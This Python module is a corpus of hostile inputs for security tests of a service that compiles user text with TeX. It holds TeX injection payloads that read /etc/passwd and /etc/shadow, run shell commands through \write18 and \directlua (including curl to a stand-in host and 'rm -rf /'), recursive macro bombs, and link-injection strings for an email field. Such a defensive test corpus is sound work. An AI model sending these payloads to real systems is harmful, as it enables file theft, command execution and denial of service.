"""Hostile-input corpus.

One list, imported by every security test, so adding a newly-discovered attack
is a one-line change that immediately applies at every entry point.

The threat model is narrow and specific: this service takes free text from a
request body and interpolates it into a document that is then handed to a TeX
engine -- a Turing-complete macro processor with a history of file-read and
shell-execution primitives. The original code passed that text through
untouched.
"""

from __future__ import annotations

#: Commands that read files, write files, or execute code.
FILE_AND_SHELL: list[str] = [
    r"\input{/etc/passwd}",
    r"\include{/etc/shadow}",
    r"\InputIfFileExists{/etc/passwd}{}{}",
    r"\immediate\write18{whoami}",
    r"\write18{curl http://evil.invalid}",
    r"\immediate\openout1=/tmp/pwned.txt",
    r"\openin1=/etc/passwd",
    r"\read1 to \x",
    r"\directlua{os.execute('id')}",
    r"\special{psfile=`rm -rf /`}",
]

#: Redefinition and category-code tricks that change how later text is parsed.
REDEFINITION: list[str] = [
    r"\catcode`\%=12",
    r"\catcode`\\=12",
    r"\def\x{malicious}",
    r"\gdef\textbf#1{}",
    r"\let\safe\input",
    r"\newcommand{\evil}{\input{/etc/passwd}}",
    r"\renewcommand{\textbf}[1]{}",
    r"\expandafter\input\jobname",
    r"\csname input\endcsname{/etc/passwd}",
    r"\lowercase{\INPUT{x}}",
]

#: Resource exhaustion -- no file access, just a compiler that never returns.
DENIAL_OF_SERVICE: list[str] = [
    r"\def\x{\x\x}\x",
    r"\loop\repeat",
    r"\newcommand{\bomb}{\bomb\bomb}\bomb",
]

#: Structural breakage: valid characters arranged to corrupt the document.
STRUCTURAL: list[str] = [
    "}" * 50,
    "{" * 50,
    r"\end{document}\input{/etc/passwd}\begin{document}",
    "text % everything after this is silently dropped",
    r"a & b & c",
    "$" * 20,
    "\\" * 40,
]

#: Encoding-level attacks aimed at the escaping layer itself.
ENCODING: list[str] = [
    "\x00\x01\x02",  # the old implementation's internal sentinel bytes
    "a\x00b",
    "\x1b[31mred\x1b[0m",
    "\r\n\r\n",
    "‮" + "reversed",  # right-to-left override
    "﻿" + "bom",
]

#: Aimed at the one value on the page that cannot be escaped: an ``\href{}``
#: target. Escaping a link breaks the link, so these are stopped by shape
#: validation or not at all -- and nothing downstream sees them, because
#: ``\href`` is on the audit allowlist and a payload that closes the brace it
#: opens passes the brace-balance check too. The header email was the field with
#: no such validation, so ``x} \href{...}{CLICK ME`` put an attacker-chosen
#: link in the resume header and returned 200 with no warnings.
LINK_TARGETS: list[str] = [
    "a}{b",
    r"x} \href{https://evil.invalid}{CLICK ME",
    r"me@example.com} \textbf{spoofed",
    "a#b@example.com",
    "a%b@example.com",
    "has space@example.com",
    r"back\slash@example.com",
    'quote"@example.com',
    "newline\n@example.com",
    "tab\t@example.com",
]

ALL_PAYLOADS: list[str] = (
    FILE_AND_SHELL + REDEFINITION + DENIAL_OF_SERVICE + STRUCTURAL + ENCODING + LINK_TARGETS
)

#: Payloads that must be *rejected* outright, because silently printing them as
#: body text on a resume is not an acceptable outcome either.
MUST_REJECT: list[str] = FILE_AND_SHELL + REDEFINITION + DENIAL_OF_SERVICE
